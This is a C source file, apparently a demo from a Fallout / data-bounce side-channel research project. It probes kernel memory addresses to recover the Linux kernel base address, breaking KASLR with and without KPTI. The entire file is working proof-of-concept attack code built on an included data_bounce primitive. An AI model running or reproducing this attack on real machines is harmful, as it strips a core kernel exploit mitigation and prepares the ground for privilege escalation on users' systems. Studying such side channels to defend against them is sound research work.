#include "../primitives/basic_primitives.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <linux/version.h>

#define KASLR_ALIGNMENT 0x100000ll

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 0, 0) // TODO: Find the exact version which introduced this change
#define KPTI_MAPPED_PAGE_OFFSET 0x800000ll
#else
#define KPTI_MAPPED_PAGE_OFFSET 0xa00000ll
#endif


#define ADDRESS_RANGE_START (void*) 0xffffffff81000000ull
#define REPS 500


int main() {
    void *addr = ADDRESS_RANGE_START - KPTI_MAPPED_PAGE_OFFSET;
    int page_size = getpagesize();
    uint8_t *mem = aligned_alloc(page_size, page_size * 256);
    memset(mem, 0xFF, page_size * 256);
    fallout_init();
    printf("Demo 4: Breaking KASLR (without access to /proc/kallsyms)\n");
    uint64_t delta = 0, kpti_offset = KPTI_MAPPED_PAGE_OFFSET;
    char *loading = "-\\|/";
    while (1) {
        printf("[%p... %c]                     \r", addr + delta + kpti_offset, loading[(delta / KASLR_ALIGNMENT) % 4]);
        fflush(stdout);
        if (data_bounce(mem, addr + delta + kpti_offset, REPS)) {
            printf("Your kernel's base address should be %p (or %p if KPTI is enabled).\n", addr + delta + kpti_offset,
                   addr + delta);
            break;
        }
        delta += KASLR_ALIGNMENT;
        if (delta > UINT64_MAX - (uint64_t) addr) {
            printf("There was no significant increase in data bounce hits anywhere in the kernel's memory region, so KASLR was not broken.\n");
            printf("Note that this method can be unreliable at times, so restarting the demo might yield different results.\n");
            break;
        }
    }
    free(mem);
    fallout_cleanup();
    return 0;
}
